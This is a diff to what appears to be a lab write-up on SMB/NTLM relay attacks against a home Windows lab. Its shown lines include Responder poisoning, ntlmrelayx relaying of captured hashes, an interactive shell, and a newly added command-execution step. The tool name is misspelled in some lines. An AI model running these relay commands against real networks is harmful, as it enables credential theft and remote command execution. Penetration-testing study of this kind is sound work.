@@ -1,5 +1,5 @@
 Setup win2022 server: 192.168.64.138   
-Setup Peterparker: 192.168.64.140  
+Setup Peterparker: \\192.168.64.140  
 Setup Frankcastle: 192.168.64.139  
 Kali: \\192.168.64.129/24
 
@@ -67,7 +67,7 @@ SMB (Server Message Block) is a protocol used for file shares, printers, and oth
 
             responder -I eth0 -dPv
 
-5. Start ntlmrelayx.py or impacket-ntlmrelax
+5. Start ntlmrelayx.py or impacket-ntlmrelax.
 
             impacket-ntlmrelax -tf targets.txt -smb2support
 
@@ -75,7 +75,7 @@ SMB (Server Message Block) is a protocol used for file shares, printers, and oth
 
 We have succesfully captured the NTLM hash from frankcastle with Responder and also relayed it back to the server using impacket-ntlmrelayx 
 
-6. Gaining interactive shell with impacket
+6. Gaining interactive shell with impacket.
 
             impacket-ntlmrelayx -tf targets.txt -smb2support -i  
 
@@ -86,9 +86,9 @@ Once netcat has been binded to list all the available arguments that is availabl
 
 ![image](https://github.com/user-attachments/assets/5ea73547-920d-4d1d-8ce7-085dadedbfc1)
 
-7. 
+7. Using command switch with impacket. 
 
-   
+            impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
 ------- 
 **Reference:**  
 
